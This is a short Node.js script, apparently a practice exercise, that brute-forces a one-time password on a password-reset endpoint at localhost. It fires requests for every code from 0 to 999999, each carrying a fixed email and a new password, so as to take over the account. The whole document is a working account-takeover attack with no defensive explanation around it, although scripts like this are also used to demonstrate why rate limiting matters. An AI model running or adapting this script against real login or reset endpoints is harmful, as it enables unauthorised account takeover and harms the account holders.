const axios = require("axios");

async function sendRequest(otp) {
  const data = JSON.stringify({
    email: "subh@gmail.com",
    otp: otp,
    newPassword: "hola-amigo",
  });

  const config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    console.log(JSON.stringify(response.data));
  } catch (error) {
    console.log(error);
  }
}

async function main() {
  for (let i = 0; i <= 999999; i++) {
    console.log(i);
    sendRequest(i.toString());
  } // Call the sendRequest function once
}

main();
